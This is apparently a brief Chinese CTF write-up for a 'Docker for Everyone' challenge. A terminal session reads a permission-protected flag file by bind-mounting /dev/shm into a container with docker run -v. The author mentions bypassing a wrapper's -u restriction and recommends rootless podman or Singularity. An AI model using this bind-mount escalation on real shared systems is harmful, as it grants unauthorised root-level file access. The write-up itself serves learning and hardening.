## Docker for Everyone

用 `-v` 挂载，简单直接：

```
alpine:~$ ls /flag -l
lrwxrwxrwx    1 root     root            13 Oct  8 12:10 /flag -> /dev/shm/flag
alpine:~$ cat /dev/shm/flag
cat: can't open '/dev/shm/flag': Permission denied
alpine:~$ docker run -it --rm -v /dev/shm:/data:ro alpine /bin/sh
/ # cat /data/flag
flag{u5e_r00t1ess_conta1ner_98d7629644_plz!}
```

常年在学校做运维，这种问题很熟悉了。以前信院有个计算集群，自己写了个 Docker wrapper 脚本，加了 `-u` 切换非 root 用户。但后来我还是找到了漏洞，可以重置掉 `-u` 拿到 root。

实在需要给普通用户用 Docker 类似物的话，可以看看 Singularity 或者 rootless podman。
